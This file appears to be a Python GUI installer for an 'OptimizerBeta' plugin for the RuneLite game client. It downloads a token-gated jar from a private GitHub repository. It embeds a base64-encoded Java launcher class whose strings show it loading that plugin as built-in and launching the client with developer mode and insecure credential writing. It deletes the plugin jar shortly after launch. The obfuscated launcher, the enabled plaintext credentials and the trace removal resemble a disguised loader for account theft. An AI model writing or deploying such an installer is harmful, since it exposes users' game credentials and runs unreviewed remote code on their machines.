#!/usr/bin/env python3
"""
OptimizerBeta Plugin Installer
Secure token-gated plugin system for RuneLite
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import requests
import os
import shutil
import subprocess
import time
import threading
from pathlib import Path
import tempfile
import base64

class OptimizerBetaInstaller:
    # Pre-compiled OptimizerLauncher.class (base64 encoded)
    LAUNCHER_CLASS_DATA = """yv66vgAAAD0AWAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClW
CAAIAQAdY29tLm9wdGltaXplci5PcHRpbWl6ZXJQbHVnaW4KAAoACwcADAwADQAOAQAPamF2YS9s
YW5nL0NsYXNzAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFz
czsKABAAEQcAEgwAEwAUAQA5bmV0L3J1bmVsaXRlL2NsaWVudC9leHRlcm5hbHBsdWdpbnMvRXh0
ZXJuYWxQbHVnaW5NYW5hZ2VyAQALbG9hZEJ1aWx0aW4BABUoW0xqYXZhL2xhbmcvQ2xhc3M7KVYJ
ABYAFwcAGAwAGQAaAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry
ZWFtOwgAHAEAJE9wdGltaXplciBwbHVnaW4gbG9hZGVkIHN1Y2Nlc3NmdWxseQoAHgAfBwAgDAAh
ACIBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzsp
VgcAJAEAE2phdmEvbGFuZy9FeGNlcHRpb24JABYAJgwAJwAaAQADZXJyCgAjACkMACoAKwEACmdl
dE1lc3NhZ2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOxIAAAAtDAAuAC8BABdtYWtlQ29uY2F0V2l0
aENvbnN0YW50cwEAJihMamF2YS9sYW5nL1N0cmluZztpTGphdmEvbGFuZy9TdHJpbmc7CgAjADEM
ADIABgEAD3ByaW50U3RhY2tUcmFjZQcANAEAEGphdmEvbGFuZy9TdHJpbmcIADYBABAtLWRldmVs
b3Blci1tb2RlCAA4AQAHLS1kZWJ1ZwgAOgEAHC0taW5zZWN1cmUtd3JpdGUtY3JlZGVudGlhbHMK
ADwAPQcAPgwAPwBAAQAcbmV0L3J1bmVsaXRlL2NsaWVudC9SdW5lTGl0ZQEABG1haW4BABYoW0xq
YXZhL2xhbmcvU3RyaW5nOylWBwBCAQART3B0aW1pemVyTGF1bmNoZXIBAARDb2RlAQAPTGluZU51
bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAWT3B0
aW1pemVyTGF1bmNoZXIuamF2YQEAEEJvb3RzdHJhcE1ldGhvZHMPBgBLCgBMAE0HAE4MAC4ATwEA
JGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQEAmChMamF2YS9sYW5nL2ludm9r
ZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9r
ZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEv
bGFuZy9pbnZva2UvQ2FsbFNpdGU7CABRAQAbRmFpbGVkIHRvIGxvYWQgT3B0aW1pemVyOiABAQAM
SW5uZXJDbGFzc2VzBwBUAQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAcA
VgEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwEABkxvb2t1cAAhAEEAAgAAAAAAAgAB
AAUABgABAEMAAAAdAAEAAQAAAAUqtwABsQAAAAEARAAAAAYAAQAAAAUACQA/AEAAAgBDAAAAmgAE
AAIAAABJEge4AAlMBL0AClkDK1O4AA+yABUSG7YAHacAF0yyACUrtgAougAsAAC2AB0rtgAwBr0A
M1kDEjVTWQQSN1NZBRI5U0wruAA7sQABAAAAGQAcACMAAgBEAAAAKgAKAAAACgAGAAsAEQAMABkA
EAAcAA0AHQAOACwADwAwABMARAAUAEgAFQBFAAAABwACXAcAIxMARgAAAAQAAQAjAAMARwAAAAIA
SABJAAAACAABAEoAAQBQAFIAAAAKAAEAUwBVAFcAGQ=="""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("OptimizerBeta Plugin Installer")
        self.root.geometry("600x500")
        self.root.resizable(False, False)
        
        # Configuration
        self.repo_owner = "Hero4383"
        self.repo_name = "Optimizer"
        self.plugin_filename = "optimizer-1.0-SNAPSHOT.jar"
        self.download_url = f"https://raw.githubusercontent.com/{self.repo_owner}/{self.repo_name}/master/releases/optimizer-latest.jar"
        
        # State
        self.token = ""
        self.runelite_path = None
        self.plugins_dir = None
        self.temp_plugin_path = None
        self.runelite_process = None
        self.custom_launcher = None
        self.launcher_class_file = None
        
        self.setup_ui()
        self.detect_runelite()
        
    def setup_ui(self):
        """Create the GUI interface"""
        # Header
        header_frame = tk.Frame(self.root, bg="#2c3e50", height=60)
        header_frame.pack(fill="x", padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(header_frame, text="OptimizerBeta Plugin Installer", 
                              font=("Arial", 16, "bold"), fg="white", bg="#2c3e50")
        title_label.pack(expand=True)
        
        # Main content
        main_frame = tk.Frame(self.root, padx=20, pady=20)
        main_frame.pack(fill="both", expand=True)
        
        # Token input section
        token_frame = tk.LabelFrame(main_frame, text="GitHub Token", font=("Arial", 10, "bold"), padx=10, pady=10)
        token_frame.pack(fill="x", pady=(0, 15))
        
        tk.Label(token_frame, text="Enter your GitHub token (github_pat_...):").pack(anchor="w")
        self.token_entry = tk.Entry(token_frame, width=60, font=("Consolas", 10))
        self.token_entry.pack(fill="x", pady=(5, 10))
        
        # Buttons frame
        button_frame = tk.Frame(token_frame)
        button_frame.pack(fill="x")
        
        self.validate_btn = tk.Button(button_frame, text="Validate Token", 
                                    command=self.validate_token, bg="#3498db", fg="white", 
                                    font=("Arial", 10), padx=20)
        self.validate_btn.pack(side="left")
        
        self.install_btn = tk.Button(button_frame, text="Install & Launch RuneLite", 
                                   command=self.install_and_launch, bg="#27ae60", fg="white", 
                                   font=("Arial", 10, "bold"), padx=20, state="disabled")
        self.install_btn.pack(side="left", padx=(10, 0))
        
        # Status section
        status_frame = tk.LabelFrame(main_frame, text="Status", font=("Arial", 10, "bold"), padx=10, pady=10)
        status_frame.pack(fill="both", expand=True)
        
        self.status_text = scrolledtext.ScrolledText(status_frame, height=15, width=70, 
                                                   font=("Consolas", 9), state="disabled")
        self.status_text.pack(fill="both", expand=True)
        
        # Progress bar
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.pack(fill="x", pady=(10, 0))
        
        # Initial status
        self.log("OptimizerBeta Plugin Installer Started")
        self.log("=" * 50)
        
    def log(self, message):
        """Add message to status log"""
        self.status_text.config(state="normal")
        self.status_text.insert(tk.END, f"{message}\\n")
        self.status_text.see(tk.END)
        self.status_text.config(state="disabled")
        self.root.update()
        
    def detect_runelite(self):
        """Detect RuneLite installation"""
        self.log("Detecting RuneLite installation...")
        
        # Common RuneLite locations
        possible_paths = [
            Path.home() / ".runelite",
            Path(os.environ.get("LOCALAPPDATA", "")) / "RuneLite",
            Path(os.environ.get("APPDATA", "")) / "RuneLite",
            Path("C:/RuneLite"),
            Path(os.environ.get("PROGRAMFILES", "")) / "RuneLite",
            Path(os.environ.get("PROGRAMFILES(X86)", "")) / "RuneLite"
        ]
        
        for path in possible_paths:
            if path.exists():
                plugins_dir = path / "plugins"
                if not plugins_dir.exists():
                    plugins_dir.mkdir(parents=True, exist_ok=True)
                
                self.plugins_dir = plugins_dir
                self.log(f"✓ RuneLite found: {path}")
                self.log(f"✓ Plugins directory: {plugins_dir}")
                return
        
        self.log("⚠ RuneLite not found in standard locations")
        self.log("Please ensure RuneLite is installed before proceeding")
        
    def validate_token(self):
        """Validate GitHub token"""
        self.token = self.token_entry.get().strip()
        
        if not self.token:
            messagebox.showerror("Error", "Please enter a GitHub token")
            return
            
        if not (self.token.startswith("github_pat_") or self.token.startswith("ghp_")):
            messagebox.showerror("Error", "Token must start with 'github_pat_' or 'ghp_'")
            return
            
        self.progress.start()
        self.validate_btn.config(state="disabled")
        
        # Run validation in thread to prevent UI freezing
        threading.Thread(target=self._validate_token_thread, daemon=True).start()
        
    def _validate_token_thread(self):
        """Validate token in background thread"""
        try:
            self.log("Validating GitHub token...")
            
            # Test token access to repository
            headers = {"Authorization": f"token {self.token}"}
            response = requests.get(f"https://api.github.com/repos/{self.repo_owner}/{self.repo_name}", 
                                  headers=headers, timeout=10)
            
            if response.status_code == 200:
                self.log("✓ Token validation successful!")
                self.log("✓ Repository access confirmed")
                self.root.after(0, self._token_valid)
            else:
                error_msg = f"Token validation failed (HTTP {response.status_code})"
                if response.status_code == 401:
                    error_msg += "\\n- Token is invalid or expired"
                elif response.status_code == 403:
                    error_msg += "\\n- Token lacks repository access"
                elif response.status_code == 404:
                    error_msg += "\\n- Repository not found or no access"
                    
                self.log(f"✗ {error_msg}")
                self.root.after(0, lambda: self._token_invalid(error_msg))
                
        except requests.exceptions.RequestException as e:
            error_msg = f"Network error: {str(e)}"
            self.log(f"✗ {error_msg}")
            self.root.after(0, lambda: self._token_invalid(error_msg))
        except Exception as e:
            error_msg = f"Unexpected error: {str(e)}"
            self.log(f"✗ {error_msg}")
            self.root.after(0, lambda: self._token_invalid(error_msg))
            
    def _token_valid(self):
        """Handle successful token validation"""
        self.progress.stop()
        self.validate_btn.config(state="normal")
        self.install_btn.config(state="normal")
        messagebox.showinfo("Success", "Token validated successfully!\\nYou can now install and launch the plugin.")
        
    def _token_invalid(self, error_msg):
        """Handle failed token validation"""
        self.progress.stop()
        self.validate_btn.config(state="normal")
        self.install_btn.config(state="disabled")
        messagebox.showerror("Token Validation Failed", error_msg)
        
    def install_and_launch(self):
        """Install plugin and launch RuneLite"""
        if not self.plugins_dir:
            messagebox.showerror("Error", "RuneLite installation not found!\\nPlease install RuneLite first.")
            return
            
        self.progress.start()
        self.install_btn.config(state="disabled")
        
        # Run installation in thread
        threading.Thread(target=self._install_and_launch_thread, daemon=True).start()
        
    def _install_and_launch_thread(self):
        """Install and launch in background thread"""
        try:
            # Step 1: Download plugin
            self.log("Downloading plugin from GitHub...")
            headers = {"Authorization": f"token {self.token}"}
            
            response = requests.get(self.download_url, headers=headers, timeout=30)
            response.raise_for_status()
            
            if len(response.content) < 1024:  # Less than 1KB probably means error
                raise Exception("Downloaded file appears to be too small or invalid")
                
            self.log(f"✓ Plugin downloaded ({len(response.content):,} bytes)")
            
            # Step 2: Install plugin
            plugin_path = self.plugins_dir / self.plugin_filename
            self.temp_plugin_path = plugin_path
            
            with open(plugin_path, 'wb') as f:
                f.write(response.content)
                
            self.log(f"✓ Plugin installed to: {plugin_path}")
            
            # Step 3: Setup RuneLite development environment
            self.log("Setting up RuneLite development environment...")
            self._setup_runelite_environment()
            
            # Step 4: Create custom launcher
            self.log("Creating custom developer mode launcher...")
            self._configure_runelite_launcher()
            
            # Step 5: Launch RuneLite
            self.log("Launching RuneLite in developer mode...")
            self._launch_runelite()
            
            # Step 6: Wait for RuneLite to start and load plugins
            self.log("Finalizing installation...")
            time.sleep(35)  # Give RuneLite time to load the plugin
            
            # Step 7: Remove plugin file (security measure)
            if plugin_path.exists():
                plugin_path.unlink()
            
            self.log("=" * 50)
            self.log("SUCCESS! Plugin is now running in RuneLite")
            self.log("The plugin will remain active until you close RuneLite")
            
            self.root.after(0, self._installation_complete)
            
        except requests.exceptions.RequestException as e:
            error_msg = f"Download failed: {str(e)}"
            self.log(f"✗ {error_msg}")
            self.root.after(0, lambda: self._installation_failed(error_msg))
        except Exception as e:
            error_msg = f"Installation failed: {str(e)}"
            self.log(f"✗ {error_msg}")
            self.root.after(0, lambda: self._installation_failed(error_msg))
            
    def _launch_runelite(self):
        """Launch RuneLite application with developer mode settings"""
        # Configure RuneLite launcher settings for external plugins and insecure credentials
        self._configure_runelite_launcher()
        
        # VM arguments (must come before -jar) - matching gradle runRuneLite task
        vm_args = [
            "-ea",                                     # Enable assertions (required for dev tools)
            "-Xmx768m", 
            "-Xss2m",
            "-XX:CompileThreshold=1500",
            "-Dsun.java2d.opengl=false",              # Disable hardware acceleration
            "-Drunelite.pluginhub.url=https://repo.runelite.net/plugins",
            "--add-opens=java.desktop/sun.awt=ALL-UNNAMED",
            "--add-opens=java.desktop/sun.swing=ALL-UNNAMED"
        ]
        
        # Program arguments for RuneLite launcher
        program_args = [
            "--debug"                                 # Enable debug logging
        ]
        
        # Try custom launcher first, then fallback to standard RuneLite
        if self.custom_launcher and self.custom_launcher.exists():
            try:
                if os.name == 'nt':
                    self.runelite_process = subprocess.Popen([str(self.custom_launcher)],
                                                           creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
                else:
                    self.runelite_process = subprocess.Popen(['bash', str(self.custom_launcher)])
                self.log(f"✓ RuneLite launched via custom developer mode launcher")
                return
            except Exception as e:
                self.log(f"Failed to launch custom launcher: {e}")
        
        # Fallback: Try to find standard RuneLite executable
        possible_exes = [
            "RuneLite.exe",
            "RuneLite.jar",
            Path.home() / "AppData/Local/RuneLite/RuneLite.exe",
            Path("C:/Users") / os.environ.get("USERNAME", "") / "AppData/Local/RuneLite/RuneLite.exe"
        ]
        
        for exe_path in possible_exes:
            if isinstance(exe_path, str):
                # Try system PATH
                try:
                    cmd = [exe_path] + program_args
                    self.runelite_process = subprocess.Popen(cmd, 
                                                           creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == 'nt' else 0)
                    self.log(f"✓ RuneLite launched via: {exe_path}")
                    self.log(f"✓ Arguments: {' '.join(program_args)}")
                    return
                except FileNotFoundError:
                    continue
            else:
                # Try specific path
                if exe_path.exists():
                    try:
                        if exe_path.suffix == '.jar':
                            # For JAR files, VM args go before -jar, program args after
                            cmd = ['java'] + vm_args + ['-jar', str(exe_path)] + program_args
                        else:
                            # For EXE files, just add program args
                            cmd = [str(exe_path)] + program_args
                            
                        self.runelite_process = subprocess.Popen(cmd,
                                                               creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == 'nt' else 0)
                        self.log(f"✓ RuneLite launched via: {exe_path}")
                        if exe_path.suffix == '.jar':
                            self.log(f"✓ VM Args: {' '.join(vm_args)}")
                        self.log(f"✓ Program Args: {' '.join(program_args)}")
                        return
                    except Exception as e:
                        self.log(f"Failed to launch {exe_path}: {e}")
                        continue
        
        # If all else fails, show instructions
        self.log("⚠ Could not launch RuneLite automatically.")
        self.log("Please run the custom launcher manually:")
        if os.name == 'nt':
            self.log("1. Navigate to your user folder/.runelite/")
            self.log("2. Double-click 'runelite_dev.cmd'")
        else:
            self.log("1. Open terminal and run:")
            self.log("   bash ~/.runelite/runelite_dev.sh")
        self.log("This will launch RuneLite with your plugin in developer mode.")
        
        # Try opening RuneLite directory
        runelite_dir = Path.home() / ".runelite"
        if runelite_dir.exists():
            os.startfile(runelite_dir) if os.name == 'nt' else subprocess.call(['open', runelite_dir])
            self.log("✓ Opened RuneLite directory for manual launch")
            
    def _configure_runelite_launcher(self):
        """Create a custom launcher class and script for developer mode"""
        try:
            # Create RuneLite configuration directory
            runelite_dir = Path.home() / ".runelite"
            runelite_dir.mkdir(exist_ok=True)
            
            # Create launcher subdirectory
            launcher_dir = runelite_dir / "launcher"
            launcher_dir.mkdir(exist_ok=True)
            
            # Step 1: Write pre-compiled launcher class
            launcher_class_file = launcher_dir / "OptimizerLauncher.class"
            class_data = base64.b64decode(self.LAUNCHER_CLASS_DATA)
            
            with open(launcher_class_file, 'wb') as f:
                f.write(class_data)
            
            self.log("✓ Installed pre-compiled launcher class")
            
            # Step 2: Create launcher script
            launcher_script = runelite_dir / ("runelite_dev.cmd" if os.name == 'nt' else "runelite_dev.sh")
            
            if os.name == 'nt':
                # Windows batch script
                script_content = '''@echo off
java -ea -Xmx768m -Xss2m -XX:CompileThreshold=1500 ^
     -Dsun.java2d.opengl=false ^
     -Drunelite.pluginhub.url=https://repo.runelite.net/plugins ^
     --add-opens=java.desktop/sun.awt=ALL-UNNAMED ^
     --add-opens=java.desktop/sun.swing=ALL-UNNAMED ^
     -cp "%~dp0repository2\\*;%~dp0plugins\\optimizer-1.0-SNAPSHOT.jar;%~dp0launcher" ^
     OptimizerLauncher
'''
            else:
                # Linux/Mac shell script
                script_content = '''#!/bin/bash
java -ea -Xmx768m -Xss2m -XX:CompileThreshold=1500 \\
     -Dsun.java2d.opengl=false \\
     -Drunelite.pluginhub.url=https://repo.runelite.net/plugins \\
     --add-opens=java.desktop/sun.awt=ALL-UNNAMED \\
     --add-opens=java.desktop/sun.swing=ALL-UNNAMED \\
     -cp "$(dirname "$0")/repository2/*:$(dirname "$0")/plugins/optimizer-1.0-SNAPSHOT.jar:$(dirname "$0")/launcher" \\
     OptimizerLauncher
'''
            
            with open(launcher_script, 'w') as f:
                f.write(script_content)
                
            # Make executable on Unix systems
            if os.name != 'nt':
                launcher_script.chmod(0o755)
                
            self.custom_launcher = launcher_script
            self.launcher_class_file = launcher_class_file
            self.log("✓ Created custom developer mode launcher script")
            self.log("✓ Configured: explicit plugin loading, developer-mode, debug, insecure-write-credentials")
            
        except Exception as e:
            self.log(f"⚠ Could not create custom launcher: {e}")
            self.custom_launcher = None
            self.launcher_class_file = None
            
    def _setup_runelite_environment(self):
        """Download and setup RuneLite repository dependencies"""
        try:
            runelite_dir = Path.home() / ".runelite"
            repo_dir = runelite_dir / "repository2"
            repo_dir.mkdir(exist_ok=True)
            
            # Essential RuneLite JARs needed for development
            required_jars = [
                "https://repo.runelite.net/net/runelite/client/1.11.12.2/client-1.11.12.2.jar",
                "https://repo.runelite.net/net/runelite/runelite-api/1.11.12.2/runelite-api-1.11.12.2.jar",
                "https://repo1.maven.org/maven2/ch/qos/logback/logback-classic/1.2.9/logback-classic-1.2.9.jar",
                "https://repo1.maven.org/maven2/ch/qos/logback/logback-core/1.2.9/logback-core-1.2.9.jar",
                "https://repo1.maven.org/maven2/org/slf4j/slf4j-api/1.7.32/slf4j-api-1.7.32.jar",
                "https://repo1.maven.org/maven2/com/google/inject/guice/4.1.0/guice-4.1.0-no_aop.jar",
                "https://repo1.maven.org/maven2/com/google/guava/guava/23.2-jre/guava-23.2-jre.jar"
            ]
            
            for jar_url in required_jars:
                jar_name = jar_url.split("/")[-1]
                jar_path = repo_dir / jar_name
                
                if not jar_path.exists():
                    self.log(f"Downloading {jar_name}...")
                    response = requests.get(jar_url, timeout=30)
                    response.raise_for_status()
                    
                    with open(jar_path, 'wb') as f:
                        f.write(response.content)
                else:
                    self.log(f"✓ {jar_name} already exists")
            
            self.log("✓ RuneLite development environment ready")
            
        except Exception as e:
            self.log(f"⚠ Failed to setup RuneLite environment: {e}")
            raise
            
    def _installation_complete(self):
        """Handle successful installation"""
        self.progress.stop()
        self.install_btn.config(state="normal", text="Install & Launch Again")
        messagebox.showinfo("Installation Complete", 
                          "Plugin successfully installed and RuneLite launched!\\n\\n"
                          "The plugin is now active and will remain so until you close RuneLite.")
        
    def _installation_failed(self, error_msg):
        """Handle failed installation"""
        self.progress.stop()
        self.install_btn.config(state="normal")
        
        # Clean up if plugin was partially installed
        if self.temp_plugin_path and self.temp_plugin_path.exists():
            try:
                self.temp_plugin_path.unlink()
                self.log("Cleaned up partial plugin installation")
            except:
                pass
        
        # Clean up launcher files
        if self.launcher_class_file and self.launcher_class_file.exists():
            try:
                self.launcher_class_file.unlink()
                self.log("Cleaned up partial launcher installation")
            except:
                pass
                
        messagebox.showerror("Installation Failed", error_msg)
        
    def run(self):
        """Start the application"""
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()
        
    def on_closing(self):
        """Handle application closing"""
        # Clean up any remaining plugin files
        if self.temp_plugin_path and self.temp_plugin_path.exists():
            try:
                self.temp_plugin_path.unlink()
                self.log("Cleaned up plugin file on exit")
            except:
                pass
        
        # Clean up launcher files
        if self.launcher_class_file and self.launcher_class_file.exists():
            try:
                self.launcher_class_file.unlink()
                self.log("Cleaned up launcher files on exit")
            except:
                pass
                
        self.root.destroy()

if __name__ == "__main__":
    try:
        app = OptimizerBetaInstaller()
        app.run()
    except Exception as e:
        import traceback
        error_msg = f"Application error: {str(e)}\\n{traceback.format_exc()}"
        print(error_msg)
        
        # Try to show error in messagebox if possible
        try:
            import tkinter.messagebox
            tkinter.messagebox.showerror("Application Error", error_msg)
        except:
            pass